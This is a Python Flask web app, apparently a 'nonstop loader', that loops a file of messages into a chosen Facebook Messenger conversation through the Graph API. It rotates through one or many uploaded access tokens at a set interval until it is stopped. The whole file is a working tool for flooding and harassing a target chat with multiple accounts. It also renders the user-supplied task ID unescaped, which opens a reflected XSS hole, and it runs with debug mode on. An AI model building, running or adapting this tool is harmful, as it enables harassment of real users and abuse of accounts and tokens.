from flask import Flask, request, render_template_string, redirect, url_for
import requests
from threading import Thread, Event
import time
import random
import string
import json

# Flask Application Initialization
app = Flask(__name__)
app.debug = True

# Global State Management for Tasks
# tasks = {task_id: {thread: Thread, stop_event: Event, status: str, thread_id: str, start_time: str}}
tasks = {}

# Standard headers for requests
HEADERS = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def send_messages(access_tokens, thread_id, display_name, time_interval, messages, task_id):
    """
    Background worker function to send messages.
    Monitors the stop_event and updates the global task status.
    """
    task_data = tasks.get(task_id)
    if not task_data:
        return # Task was likely deleted

    stop_event = task_data['stop_event']
    tasks[task_id]['status'] = 'Running'
    tasks[task_id]['sent_count'] = 0

    try:
        # Loop until stop signal is received
        while not stop_event.is_set():
            for message_body in messages:
                if stop_event.is_set():
                    break
                
                # Cycle through all access tokens
                for access_token in access_tokens:
                    if stop_event.is_set():
                        break

                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    # Prepend display_name to the message body
                    message_to_send = f"{display_name} | {message_body}"
                    parameters = {'access_token': access_token, 'message': message_to_send}
                    
                    try:
                        response = requests.post(api_url, data=parameters, headers=HEADERS)
                        tasks[task_id]['sent_count'] += 1
                        
                        if response.status_code == 200:
                            print(f"[{task_id}] SUCCESS: {message_to_send[:30]}... from token {access_token[:5]}...")
                        else:
                            print(f"[{task_id}] FAILED ({response.status_code}): {response.text[:50]}...")
                            # Optionally handle bad tokens here (e.g., remove them)
                            
                    except requests.exceptions.RequestException as e:
                        print(f"[{task_id}] REQUEST ERROR: {e}")

                    # Wait for the specified interval before sending the next message
                    time.sleep(time_interval)
            
            # After cycling through all messages, restart the loop if not stopped

    finally:
        # Update status when the loop breaks
        if tasks.get(task_id):
            if stop_event.is_set():
                 tasks[task_id]['status'] = 'Stopped by User'
            else:
                 tasks[task_id]['status'] = 'Completed All Cycles' # Or 'Completed' if intended to be one cycle
            print(f"[{task_id}] Task finished. Status: {tasks[task_id]['status']}")


@app.route('/', methods=['GET', 'POST'])
def index():
    """
    Main route for starting the messaging task.
    Handles both GET (display form) and POST (start task).
    """
    if request.method == 'POST':
        try:
            # --- 1. Get and Validate Form Data ---
            token_option = request.form.get('tokenOption')
            access_tokens = []
            
            if token_option == 'single':
                single_token = request.form.get('singleToken')
                if not single_token: raise ValueError("Single token is required.")
                access_tokens = [single_token.strip()]
            elif token_option == 'multiple':
                token_file = request.files.get('tokenFile')
                if not token_file: raise ValueError("Token file is required.")
                access_tokens = [t.strip() for t in token_file.read().decode().splitlines() if t.strip()]
            
            if not access_tokens: raise ValueError("No valid access tokens provided.")

            thread_id = request.form.get('threadId')
            display_name = request.form.get('displayName')
            time_interval = int(request.form.get('time'))
            
            txt_file = request.files.get('txtFile')
            if not txt_file: raise ValueError("Message file is required.")
            messages = [m.strip() for m in txt_file.read().decode().splitlines() if m.strip()]
            
            if not messages: raise ValueError("Message file is empty.")

            # --- 2. Initialize Task ---
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            stop_event = Event()
            
            # --- 3. Store Task Metadata ---
            tasks[task_id] = {
                'thread_id': thread_id,
                'display_name': display_name,
                'token_count': len(access_tokens),
                'message_count': len(messages),
                'interval': time_interval,
                'status': 'Starting',
                'sent_count': 0,
                'start_time': time.strftime("%Y-%m-%d %H:%M:%S"),
                'stop_event': stop_event,
            }

            # --- 4. Start Thread ---
            thread = Thread(target=send_messages, 
                            args=(access_tokens, thread_id, display_name, time_interval, messages, task_id), 
                            daemon=True)
            
            tasks[task_id]['thread'] = thread
            thread.start()

            return render_template_string(
                SUCCESS_TEMPLATE, 
                task_id=task_id, 
                thread_id=thread_id,
                message_count=len(messages),
                token_count=len(access_tokens)
            )

        except Exception as e:
            return render_template_string(ERROR_TEMPLATE, error_message=str(e))

    return render_template_string(MAIN_TEMPLATE)


@app.route('/stop', methods=['POST'])
def stop_task():
    """
    Route to stop a running task using its ID.
    """
    task_id = request.form.get('taskId')
    task_data = tasks.get(task_id)
    
    if task_data and task_data['status'] == 'Running':
        task_data['stop_event'].set()
        task_data['status'] = 'Stopping...'
        return render_template_string(
            STATUS_TEMPLATE, 
            message=f"✅ Task ID **{task_id}** ko rokne ka signal bhej diya gaya hai. Status check karein.",
            task_data=tasks
        )
    elif task_data:
        return render_template_string(
            STATUS_TEMPLATE, 
            message=f"❌ Task ID **{task_id}** abhi {task_data['status']} mein hai. Rokne ki zaroorat nahi.",
            task_data=tasks
        )
    else:
        return render_template_string(
            STATUS_TEMPLATE, 
            message=f"❌ Koi Task ID **{task_id}** nahi mila.",
            task_data=tasks
        )


@app.route('/status')
def status_page():
    """
    Monitoring System: Displays the status of all active and past tasks.
    """
    # Clean up non-existent threads (optional, but good practice)
    # Note: Status should be updated by the thread itself, but this is a fallback
    for task_id, data in list(tasks.items()):
        if data.get('thread') and data.get('thread').is_alive() == False and data['status'] == 'Running':
            data['status'] = 'Completed (Thread Finished)'
            
    return render_template_string(STATUS_TEMPLATE, message="📋 Active Task Monitoring System", task_data=tasks)

# --- HTML TEMPLATES (Enhanced Stylish Design) ---

BASE_STYLE = '''
    <style>
        :root {
            --color-primary: #00FFC0; /* Neon Green/Aqua */
            --color-secondary: #0077FF; /* Neon Blue */
            --color-accent: #FF00FF; /* Neon Pink */
            --color-background: #0D1117; /* Dark GitHub Black */
            --color-card: #161B22; /* Slightly Lighter Dark */
            --color-text: #E6EDF3;
            --font-main: 'Fira Code', 'Roboto Mono', monospace;
            --glow-1: 0 0 5px var(--color-primary), 0 0 10px var(--color-primary);
            --glow-2: 0 0 8px var(--color-secondary), 0 0 16px var(--color-secondary);
            --glow-3: 0 0 8px var(--color-accent), 0 0 16px var(--color-accent);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, var(--color-background) 0%, #1a1f2e 100%);
            min-height: 100vh;
            color: var(--color-text);
            font-family: var(--font-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 255, 192, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(0, 119, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(255, 0, 255, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }
        .container {
            background-color: var(--color-card);
            border-radius: 16px;
            max-width: 500px;
            width: 100%;
            padding: 35px;
            margin: 20px auto;
            /* Enhanced Glowing Border */
            border: 1px solid var(--color-secondary);
            box-shadow: 
                0 0 15px rgba(0, 119, 255, 0.5),
                0 0 30px rgba(0, 255, 192, 0.3),
                inset 0 0 15px rgba(0, 119, 255, 0.1);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, var(--color-primary), var(--color-secondary), var(--color-accent), var(--color-primary));
            border-radius: 18px;
            z-index: -1;
            opacity: 0.3;
            filter: blur(5px);
        }
        .container:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 0 25px rgba(0, 119, 255, 0.7),
                0 0 40px rgba(0, 255, 192, 0.5),
                inset 0 0 20px rgba(0, 119, 255, 0.2);
        }
        h1 {
            text-align: center;
            color: var(--color-primary);
            text-shadow: 0 0 10px rgba(0, 255, 192, 0.8);
            margin-bottom: 30px;
            font-size: 2rem;
            letter-spacing: 3px;
            font-weight: 700;
            position: relative;
            padding-bottom: 15px;
        }
        h1::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 25%;
            width: 50%;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--color-primary), transparent);
            border-radius: 2px;
        }
        label {
            color: var(--color-primary);
            font-weight: 600;
            margin-bottom: 8px;
            display: block;
            font-size: 0.95rem;
            text-shadow: 0 0 5px rgba(0, 255, 192, 0.3);
        }
        .form-control {
            width: 100%;
            padding: 12px 18px;
            margin-bottom: 20px;
            border-radius: 8px;
            border: 1px solid #30363D;
            background: linear-gradient(135deg, #010409 0%, #0a0f18 100%);
            color: var(--color-text);
            transition: all 0.3s;
            font-family: var(--font-main);
            font-size: 0.9rem;
        }
        .form-control:focus {
            outline: none;
            border-color: var(--color-primary);
            box-shadow: 0 0 10px rgba(0, 255, 192, 0.8);
            background: linear-gradient(135deg, #010409 0%, #0d1422 100%);
            transform: translateY(-2px);
        }
        select.form-control {
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg fill="%2300ffc0" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 15px center;
            background-size: 1.2em;
        }
        /* Enhanced Stylish Buttons */
        .btn-submit {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-top: 15px;
            font-family: var(--font-main);
            position: relative;
            overflow: hidden;
        }
        .btn-submit::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        .btn-submit:hover::before {
            left: 100%;
        }
        .btn-run {
            background: linear-gradient(135deg, var(--color-primary) 0%, #00cc99 100%);
            color: var(--color-background);
            box-shadow: 0 0 15px rgba(0, 255, 192, 0.5);
        }
        .btn-run:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(0, 255, 192, 0.8);
        }
        .btn-stop {
            background: linear-gradient(135deg, #FF4444 0%, #cc3333 100%);
            color: var(--color-text);
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);
        }
        .btn-stop:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(255, 68, 68, 0.8);
        }
        .btn-status {
            background: linear-gradient(135deg, var(--color-secondary) 0%, #0066cc 100%);
            color: var(--color-text);
            box-shadow: 0 0 15px rgba(0, 119, 255, 0.5);
            text-decoration: none;
            display: block;
            text-align: center;
        }
        .btn-status:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(0, 119, 255, 0.8);
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 0.8rem;
            color: #58A6FF;
        }
        .footer a {
            color: var(--color-primary);
            text-decoration: none;
            transition: all 0.3s;
        }
        .footer a:hover {
            text-shadow: 0 0 8px rgba(0, 255, 192, 0.8);
        }
        .message-box {
            background: linear-gradient(135deg, #21262D 0%, #1a1f2e 100%);
            border: 1px solid #30363D;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            font-size: 0.95rem;
            color: var(--color-text);
            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
        }
        
        /* Enhanced Status Table Styling */
        .status-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 25px;
            font-size: 0.9rem;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
        }
        .status-table th, .status-table td {
            border: 1px solid #30363D;
            padding: 12px 15px;
            text-align: left;
        }
        .status-table th {
            background: linear-gradient(135deg, var(--color-secondary) 0%, #0055aa 100%);
            color: white;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            font-weight: 700;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        .status-table tr:nth-child(even) {
            background-color: rgba(22, 27, 34, 0.7);
        }
        .status-table tr:hover {
            background-color: rgba(33, 38, 45, 0.9);
            transform: scale(1.01);
            transition: all 0.2s ease;
        }
        .status-running { 
            color: var(--color-primary); 
            font-weight: bold;
            text-shadow: 0 0 5px rgba(0, 255, 192, 0.5);
        }
        .status-stopped, .status-completed { 
            color: #58A6FF; 
        }
        .status-stopping { 
            color: #FFD35C;
            text-shadow: 0 0 5px rgba(255, 211, 92, 0.5);
        }
        .status-error { 
            color: #FF4444;
            text-shadow: 0 0 5px rgba(255, 68, 68, 0.5);
        }

        hr {
            border: none;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--color-secondary), transparent);
            margin: 30px 0;
            border-radius: 2px;
        }

        @media (max-width: 600px) {
            .container {
                margin: 10px auto;
                padding: 25px;
            }
            h1 {
                font-size: 1.6rem;
            }
            .status-table thead { display: none; }
            .status-table tr { 
                display: block; 
                margin-bottom: 15px;
                border: 1px solid #30363D;
                border-radius: 10px;
                background: rgba(22, 27, 34, 0.9);
            }
            .status-table td { 
                display: block; 
                text-align: right; 
                border: none;
                border-bottom: 1px dashed #30363D;
                position: relative;
                padding-left: 50%;
            }
            .status-table td::before {
                content: attr(data-label);
                position: absolute;
                left: 15px;
                font-weight: bold;
                color: var(--color-secondary);
                text-transform: uppercase;
                font-size: 0.8rem;
            }
        }

        /* Animation for status updates */
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        .status-updating {
            animation: pulse 1.5s infinite;
        }
    </style>
'''

# --- MAIN FORM TEMPLATE ---
MAIN_TEMPLATE = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>✨ Neon Messenger Pro | WALEED ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
    {BASE_STYLE}
</head>
<body>
    <div class="container">
        <h1>✨ WALEED KIING NONSTOP LODER ❤️✨</h1>

        <!-- Start Task Form -->
        <form method="post" enctype="multipart/form-data">
            <div>
                <label for="tokenOption">Token Option Chunein (Select Token Option)</label>
                <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
                    <option value="single">Ek Token (Single Token)</option>
                    <option value="multiple">Token File (Multiple Tokens)</option>
                </select>
            </div>
            <div id="singleTokenInput">
                <label for="singleToken">Single Token Daalein</label>
                <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAABwzLixnjYBO...">
            </div>
            <div id="tokenFileInput" style="display: none;">
                <label for="tokenFile">Token File Upload Karein (.txt)</label>
                <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
            </div>
            <div>
                <label for="threadId">Inbox/Convo UID Daalein</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required placeholder="t_1234567890123456">
            </div>
            <div>
                <label for="displayName">Display Name Daalein (Message ke shuru mein dikhega)</label>
                <input type="text" class="form-control" id="displayName" name="displayName" required placeholder="Your Display Name">
            </div>
            <div>
                <label for="time">Time Interval (Seconds)</label>
                <input type="number" class="form-control" id="time" name="time" value="5" min="1" required>
            </div>
            <div>
                <label for="txtFile">Message File Upload Karein (.txt, har line ek naya message)</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <button type="submit" class="btn-submit btn-run">🚀 Task Shuru Karein (Start Task)</button>
        </form>

        <hr>

        <!-- Stop Task Form -->
        <form method="post" action="/stop">
            <div>
                <label for="taskId">Task ID Daalein Rokne Ke Liye (To Stop Task)</label>
                <input type="text" class="form-control" id="taskId" name="taskId" required placeholder="Task ID from success page">
            </div>
            <button type="submit" class="btn-submit btn-stop">🛑 Task Rokein (Stop Task)</button>
        </form>
        
        <!-- Status Button -->
        <a href="/status" class="btn-submit btn-status" style="margin-top: 20px;">📋 Task Status Dekhein (View Status)</a>

    </div>
    <div class="footer">
        <p>© 2025 𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 Messenger | <a href="https://github.com/yourprofile">GitHub</a></p>
        <p>Yeh App Vercel Deployment ke liye banaya gaya hai. (Designed for Vercel Deployment)</p>
    </div>
    <script>
        // JavaScript for file input toggling
        function toggleTokenInput() {{
            var tokenOption = document.getElementById('tokenOption').value;
            document.getElementById('singleTokenInput').style.display = (tokenOption == 'single' ? 'block' : 'none');
            document.getElementById('tokenFileInput').style.display = (tokenOption == 'multiple' ? 'block' : 'none');
            
            // Required attribute management
            document.getElementById('singleToken').required = (tokenOption == 'single');
            document.getElementById('tokenFile').required = (tokenOption == 'multiple');
        }}
        // Initialize state on load
        window.onload = toggleTokenInput;

        // Auto-refresh status page every 10 seconds if we're on status page
        if (window.location.pathname === '/status') {{
            setTimeout(function() {{
                window.location.reload();
            }}, 10000);
        }}
    </script>
</body>
</html>
'''

# --- SUCCESS TEMPLATE ---
SUCCESS_TEMPLATE = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>✨ Success | WALEED ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
    {BASE_STYLE}
</head>
<body>
    <div class="container">
        <h1>✅ Task Successfully Started</h1>
        <div class="message-box" style="border-color: var(--color-primary);">
            <p style="color: var(--color-primary); font-weight: bold; font-size: 1.1rem;">Task ID:</p>
            <p style="word-break: break-all; margin-bottom: 15px; background: rgba(0, 255, 192, 0.1); padding: 10px; border-radius: 5px;">{{{{ task_id }}}}</p>
            <p><strong>Target Convo ID:</strong> <span style="color: var(--color-secondary);">{{{{ thread_id }}}}</span></p>
            <p><strong>Tokens Used:</strong> <span style="color: var(--color-secondary);">{{{{ token_count }}}}</span></p>
            <p><strong>Messages Loaded:</strong> <span style="color: var(--color-secondary);">{{{{ message_count }}}}</span></p>
            <p style="margin-top: 15px; color: var(--color-primary); font-weight: bold;">**Is Task ID ko save kar lein rokne ke liye!**</p>
        </div>
        <a href="/" class="btn-submit btn-run">🏠 Home Par Wapas Jaane</a>
        <a href="/status" class="btn-submit btn-status">📋 Task Status Dekhein</a>
    </div>
    <div class="footer">
        <p>© 2025 𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 Messenger</p>
    </div>
</body>
</html>
'''

# --- ERROR TEMPLATE ---
ERROR_TEMPLATE = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>❌ Error | WALEED ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
    {BASE_STYLE}
</head>
<body>
    <div class="container" style="border-color: #FF4444; box-shadow: 0 0 15px rgba(255, 68, 68, 0.5);">
        <h1>❌ Error Aaya (An Error Occurred)</h1>
        <div class="message-box" style="border-color: #FF4444;">
            <p style="color: #FF4444; font-weight: bold; font-size: 1.1rem;">Error Detail:</p>
            <p style="word-break: break-all; background: rgba(255, 68, 68, 0.1); padding: 10px; border-radius: 5px;">{{{{ error_message }}}}</p>
            <p style="margin-top: 15px;">Kripya Form Mein Sahi Jaankari Daalein. (Please enter correct information in the form.)</p>
        </div>
        <a href="/" class="btn-submit btn-run">🏠 Home Par Wapas Jaane</a>
    </div>
    <div class="footer">
        <p>© 2025 𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 Messenger</p>
    </div>
</body>
</html>
'''

# --- STATUS/MONITORING TEMPLATE ---
STATUS_TEMPLATE = f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📋 Task Status | WALEED ✨</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
    {BASE_STYLE}
</head>
<body>
    <div class="container" style="max-width: 900px;">
        <h1>📋 Active Task Monitoring</h1>
        
        <div class="message-box">
            {{{{ message | safe }}}}
            <p style="margin-top: 10px; font-size: 0.9rem; color: var(--color-secondary);">Auto-refresh every 10 seconds</p>
        </div>
        
        <a href="/" class="btn-submit btn-run" style="margin-bottom: 20px;">🏠 Home</a>

        {{% if task_data %}}
        <table class="status-table">
            <thead>
                <tr>
                    <th>Task ID</th>
                    <th>Status</th>
                    <th>Sent/Total</th>
                    <th>Target ID</th>
                    <th>Interval (s)</th>
                    <th>Start Time</th>
                </tr>
            </thead>
            <tbody>
                {{% for task_id, data in task_data.items() %}}
                {{% set status_class = 'status-running' if data.status == 'Running' else ('status-stopping' if 'Stopping' in data.status else ('status-stopped' if 'Stopped' in data.status else 'status-completed')) %}}
                <tr class="{{{{ status_class }}}}">
                    <td data-label="Task ID" style="font-weight: bold; color: var(--color-secondary);">{{{{ task_id }}}}</td>
                    <td data-label="Status" class="{{{{ status_class }}}}">{{{{ data.status }}}}</td>
                    <td data-label="Sent/Total">{{{{ data.sent_count }}}} / {{{{ data.message_count * data.token_count }}}}</td>
                    <td data-label="Target ID" style="word-break: break-all;">{{{{ data.thread_id }}}}</td>
                    <td data-label="Interval (s)">{{{{ data.interval }}}}</td>
                    <td data-label="Start Time">{{{{ data.start_time }}}}</td>
                </tr>
                {{% endfor %}}
            </tbody>
        </table>
        {{% else %}}
        <div class="message-box" style="text-align: center; color: #FFD35C;">
            <p>Abhi koi active ya history task nahi hai.</p>
        </div>
        {{% endif %}}

    </div>
    <div class="footer">
        <p>© 2025 𝐓𝐇𝐄 𝐖𝐀𝐋𝐄𝐄𝐃 Messenger</p>
    </div>
    <script>
        // Auto-refresh the status page every 10 seconds
        setTimeout(function() {{
            window.location.reload();
        }}, 10000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    # Yeh sirf local testing ke liye hai. Vercel isko ignore kar dega.
    app.run(host='0.0.0.0', port=5000)
